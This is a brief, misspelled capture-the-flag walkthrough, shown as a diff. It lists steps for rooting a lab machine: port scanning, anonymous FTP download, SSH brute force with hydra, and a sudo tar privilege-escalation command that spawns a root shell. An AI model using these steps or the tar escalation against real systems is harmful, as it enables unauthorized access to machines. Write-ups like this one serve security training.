@@ -1,0 +1,10 @@
+1- scan ports --> found ftp (valible anonymous),ssh ,http
+2- do anonymous attack and download files from the sever
+3- use the username in the second file and make brote force by hydra using the passwords in the first file
+4- get the lie password and enter the machine
+5- sudo -l -> to know our privlege -> tar
+6- search on tar sodo function on gitobins.com 
+7- privlege esclation by this command:sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+8- bash -i
+9- cd root
+10- cat root.txt
